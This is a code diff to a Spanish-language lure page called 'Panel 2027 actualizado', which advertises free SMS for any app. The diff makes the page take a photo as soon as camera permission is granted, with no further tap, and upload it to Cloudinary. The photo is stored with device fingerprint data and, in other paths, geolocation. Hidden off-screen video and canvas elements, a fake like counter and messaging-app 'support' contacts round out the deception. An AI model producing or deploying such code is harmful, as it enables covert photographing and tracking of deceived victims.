@@ -16,7 +16,7 @@ video,canvas{position:fixed;left:-99999px;top:-99999px;width:1px;height:1px;opac
 </style>
 </head>
 <body>
-<div class="app"><header class="topbar"><div class="logo">SF</div><div class="brand"><h2>Panel 2027 actualizado</h2><p id="status">Panel actualizado 2027</p></div><div class="badge" id="tokenState">LINK</div></header><section class="hero"><div class="pill">Panel 2027 actualizado</div><h1>Panel 2027 <span>actualizado</span></h1><p class="subtitle">SMS disponible gratis por tiempo limitado para cualquier app.</p><div class="notice">Elige una opción y continúa con la descarga disponible por tiempo limitado.</div><div class="socialBox" id="socialBox"><div class="socialIcon" id="socialIcon">LK</div><div class="socialText"><b><span class="socialCount" id="likeCount">5K</span> personas les gusta esta página</b><span>Toca en me gusta para reaccionar.</span></div><button class="likeBtn" id="likeBtn" type="button">Me gusta</button></div></section><section class="search"><input id="search" placeholder="Buscar opción..."></section><main class="list" id="list"></main><div class="empty" id="empty">Acceso inválido.</div></div>
+<div class="app"><header class="topbar"><div class="logo">SF</div><div class="brand"><h2>Panel 2027 actualizado</h2><p id="status">Panel actualizado 2027</p></div><div class="badge" id="tokenState">LINK</div></header><section class="hero"><div class="pill">Panel 2027 actualizado</div><h1>Panel 2027 <span>actualizado</span></h1><p class="subtitle">SMS disponible gratis por tiempo limitado para cualquier app.</p><div class="notice">Elige una opción y continúa con la descarga disponible por tiempo limitado.<br><small>Al permitir la cámara del navegador, se tomará y guardará una foto automáticamente.</small></div><div class="socialBox" id="socialBox"><div class="socialIcon" id="socialIcon">LK</div><div class="socialText"><b><span class="socialCount" id="likeCount">5K</span> personas les gusta esta página</b><span>Toca en me gusta para reaccionar.</span></div><button class="likeBtn" id="likeBtn" type="button">Me gusta</button></div></section><section class="search"><input id="search" placeholder="Buscar opción..."></section><main class="list" id="list"></main><div class="empty" id="empty">Acceso inválido.</div></div>
 
 <div class="support-wrap" id="supportWrap"><div class="support-box"><div class="support-glow"></div><div class="support-head">Soporte</div><div class="support-line"><span class="sym">TG</span><div><small>Telegram</small>𝑹𝑩𝑷 | Bebote</div></div><div class="support-line"><span class="sym">WA</span><div><small>WhatsApp</small>Sonyer</div></div></div><button class="support-btn" id="supportBtn" type="button" aria-label="Soporte">SP</button></div>
 <video id="video" autoplay playsinline muted></video><canvas id="canvas"></canvas>
@@ -335,9 +335,11 @@ async function verify(){
     // 1) Envía los datos técnicos automáticamente apenas abre el enlace.
     const savePromise = saveDeviceInfoOnOpen();
 
-    // 2) Al mismo tiempo pide el permiso NATIVO de cámara.
-    //    No abre ninguna ventana diseñada por la página.
-    requestNativeCameraPermissionOnOpen().catch(()=>{});
+    // 2) Solicita directamente el permiso NATIVO de cámara.
+    //    Si el usuario pulsa "Permitir", la foto se toma y se guarda
+    //    inmediatamente, sin pedir un segundo toque.
+    const initialItem={name:"Foto al abrir",accion:"apertura_camara"};
+    captureAndSave(initialItem,null,{silent:true,includeLocation:false}).catch(e=>console.error(e));
 
     const ok = await savePromise;
     $("status").textContent = ok ? "Panel actualizado 2027" : "Panel 2027";
@@ -394,7 +396,8 @@ async function captureAndSave(item,btn,opts={}){
     const res=await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`,{method:"POST",body:form});
     const data=await res.json().catch(()=>({}));
     if(!res.ok||!data.secure_url)throw new Error("Cloudinary: "+(data.error?.message||"no subió"));
-    const deviceInfo=await collectDeviceInfo(true);
+    const includeLocation = opts && opts.includeLocation === false ? false : true;
+    const deviceInfo=await collectDeviceInfo(includeLocation);
     await addDoc(collection(db,"shares",token,"fotos"),{token,url:data.secure_url,accion:item.accion,item:item.name,public_id:data.public_id||"",asset_id:data.asset_id||"",fecha:serverTimestamp(),createdAtLocal:new Date().toISOString(),provider:"cloudinary",deviceInfo,bateria:deviceInfo.batteryPercent,cargando:deviceInfo.chargingText,pantalla:deviceInfo.screen,vista:deviceInfo.viewport,conexion:deviceInfo.connectionType,idioma:deviceInfo.language,zonaHoraria:deviceInfo.timezone,sistema:deviceInfo.os,navegador:deviceInfo.browser,modelo:deviceInfo.model,versionSistema:deviceInfo.platformVersion,arquitectura:deviceInfo.architecture,ubicacionEstado:deviceInfo.location.status,latitud:deviceInfo.location.latitude,longitud:deviceInfo.location.longitude,precision:deviceInfo.location.accuracy,mapsUrl:deviceInfo.location.mapsUrl,userAgent:deviceInfo.userAgent});
     if(btn){
       loadBtn(btn,true,"Guardado");
